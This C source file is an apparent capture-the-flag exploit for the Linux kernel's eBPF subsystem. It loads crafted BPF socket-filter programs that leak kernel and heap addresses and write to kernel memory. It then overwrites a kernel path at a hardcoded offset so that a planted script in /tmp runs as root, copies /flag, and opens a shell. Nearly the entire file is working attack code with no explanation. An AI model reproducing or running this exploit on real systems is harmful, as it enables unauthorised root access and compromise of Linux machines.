#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>
#include <sys/stat.h>
#define PAUSE {int x;puts("PAUSE");read(0,&x,4);}

#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
	((struct bpf_insn){                        \
		.code = CODE,                          \
		.dst_reg = DST,                        \
		.src_reg = SRC,                        \
		.off = OFF,                            \
		.imm = IMM})

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)    \
	((struct bpf_insn){                    \
		.code = BPF_LD | BPF_DW | BPF_IMM, \
		.dst_reg = DST,                    \
		.src_reg = SRC,                    \
		.off = 0,                          \
		.imm = (__u32)(IMM)}),             \
		((struct bpf_insn){                \
			.code = 0,                     \
			.dst_reg = 0,                  \
			.src_reg = 0,                  \
			.off = 0,                      \
			.imm = ((__u64)(IMM)) >> 32})

#define BPF_MOV64_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC) BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM) BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD) BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

int doredact = 0;
#define LOG_BUF_SIZE 65536
char bpf_log_buf[LOG_BUF_SIZE];
char buffer[64];
int sockets[2];
int mapfd;
int _mapfd[0x10];

void fail(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[!] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
	exit(1);
}

void redact(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	if (doredact)
	{
		fprintf(stdout, "[!] ( ( R E D A C T E D ) )\n");
		return;
	}
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

void msg(const char *fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	fprintf(stdout, "[*] ");
	vfprintf(stdout, fmt, args);
	va_end(args);
}

int bpf_create_map(enum bpf_map_type map_type,
				   unsigned int key_size,
				   unsigned int value_size,
				   unsigned int max_entries,
				   unsigned int map_fd)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries,
		.inner_map_fd = map_fd};

	return syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int bpf_update_elem(int fd, const void *key, const void *value,
					uint64_t flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type,
				  const struct bpf_insn *insns, int insn_cnt,
				  const char *license)
{
	union bpf_attr attr = {
		.prog_type = type,
		.insns = ptr_to_u64(insns),
		.insn_cnt = insn_cnt,
		.license = ptr_to_u64(license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 3,
	};

	return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}

void write32(size_t addr, uint32_t data)
{
	uint64_t key = 0;
	data -= 1;
	if (bpf_update_elem(mapfd, &key, &data, addr)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}

#define BPF_LD_ABS(SIZE, IMM)                      \
	((struct bpf_insn){                            \
		.code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
		.dst_reg = 0,                              \
		.src_reg = 0,                              \
		.off = 0,                                  \
		.imm = IMM})

#define BPF_MAP_GET(idx, dst)                                                \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
		BPF_EXIT_INSN(),                                                     \
		BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                              \
		BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)											 \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                     \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                              \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \
		BPF_EXIT_INSN(),                                                     \
		BPF_MOV64_REG((dst), BPF_REG_0),                              \
		BPF_MOV64_IMM(BPF_REG_0, 0)

int load_prog();
int write_msg()
{
	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
	if (n < 0)
	{
		perror("write");
		return 1;
	}
	if (n != sizeof(buffer))
	{
		fprintf(stderr, "short write: %ld\n", n);
	}
	return 0;
}

void update_elem(int key, size_t val)
{
	if (bpf_update_elem(mapfd, &key, &val, 0)) {
		fail("bpf_update_elem failed '%s'\n", strerror(errno));
	}
}

size_t get_elem(int key)
{
	size_t val;
	if (bpf_lookup_elem(mapfd, &key, &val)) {
		fail("bpf_lookup_elem failed '%s'\n", strerror(errno));
	}
	return val;
}

int load_prog2()
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, mapfd),

		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),	
		BPF_MAP_GET_ADDR(1,BPF_REG_7),
		BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_8,0x0),
		
		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),	
		BPF_MOV64_IMM(BPF_REG_6,0),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x110),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_8,BPF_REG_6),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x239d4c0),
		BPF_MAP_GET_ADDR(0,BPF_REG_7),
		BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_6,0x0),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}
	

void prepare(){
	int fd = open("/tmp/x",O_WRONLY|O_CREAT,0777);
	char msg[] = "#!/bin/sh\ncat /flag > /tmp/root";
	write(fd,msg,sizeof(msg));
	close(fd);

	fd = open("/tmp/y",O_WRONLY|O_CREAT,0777);
	write(fd,"\xff\xff\xff\xff",4);
	close(fd);
}

int main(int argc,char** argv)
{

	prepare();
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,4,8,0x100,0);
	int progfd = load_prog2();
	if (progfd < 0)
	{
		if (errno == EACCES)
		{
			msg("log:\n%s", bpf_log_buf);
		}
		printf("%s\n", bpf_log_buf);
		fail("failed to load prog '%s'\n", strerror(errno));
	}

	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
	{
		fail("failed to create socket pair '%s'\n", strerror(errno));
	}

	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
	{
		fail("setsockopt '%s'\n", strerror(errno));
	}

	write_msg();

	size_t kaddr = get_elem(0);
	size_t heap  = get_elem(1);
	printf("%p\n",(void*)get_elem(0));
	printf("%p\n",(void*)get_elem(1));

	progfd = load_prog();
        if (progfd < 0)
        {
                if (errno == EACCES)
                {
                        msg("log:\n%s", bpf_log_buf);
                }
                printf("%s\n", bpf_log_buf);
                fail("failed to load prog '%s'\n", strerror(errno));
        }

        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
        {
                fail("failed to create socket pair '%s'\n", strerror(errno));
        }

        if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
        {
                fail("setsockopt '%s'\n", strerror(errno));
        }

	update_elem(2,0x0000000400000017);
	update_elem(3,0xffffffff00000008);
	update_elem(4,0x0000000000000000);
	write_msg();

	char* path = "/tmp/x";
	uint32_t *p = (uint32_t *) path;
	write32(kaddr+0x284DB40,p[0]);
	write32(kaddr+0x284DB44,p[1]);
	execve("/tmp/y",0,0);
	system("cat /tmp/root && sh");
}


int load_prog()
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, mapfd),

		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),	
		BPF_MAP_GET_ADDR(1,BPF_REG_7),
		BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_8,0x0),
		
		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),	
		BPF_MOV64_IMM(BPF_REG_6,0),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x110),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_8,BPF_REG_6),
		BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x239d4c0),
		BPF_MAP_GET_ADDR(0,BPF_REG_7),
		BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_6,0x0),


		BPF_MAP_GET(0,BPF_REG_6),
		BPF_ALU64_IMM(BPF_ADD,BPF_REG_6,0x1177620),
		BPF_MAP_GET_ADDR(0xe,BPF_REG_7),
		BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_6,0x0),


		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),
		BPF_MOV64_IMM(BPF_REG_6,0),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x110-0x18),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_8,BPF_REG_6),
		BPF_MAP_GET(2,BPF_REG_6),
		BPF_STX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x0),

		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),
		BPF_MOV64_IMM(BPF_REG_6,0),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x110-0x20),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_8,BPF_REG_6),
		BPF_MAP_GET(3,BPF_REG_6),
		BPF_STX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x0),

		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),
		BPF_MOV64_IMM(BPF_REG_6,0),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x110-0x28),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_8,BPF_REG_6),
		BPF_MAP_GET(4,BPF_REG_6),
		BPF_STX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x0),

		BPF_MAP_GET_ADDR(0,BPF_REG_8),
		BPF_ALU64_IMM(BPF_XOR,BPF_REG_8,0x0),
		BPF_MOV64_IMM(BPF_REG_6,0),
		BPF_ALU64_REG(BPF_ADD,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_IMM(BPF_SUB,BPF_REG_6,0x110-0x00),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_6,BPF_REG_8),
		BPF_ALU64_REG(BPF_XOR,BPF_REG_8,BPF_REG_6),
		BPF_MAP_GET(1,BPF_REG_6),
		BPF_STX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x0),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}


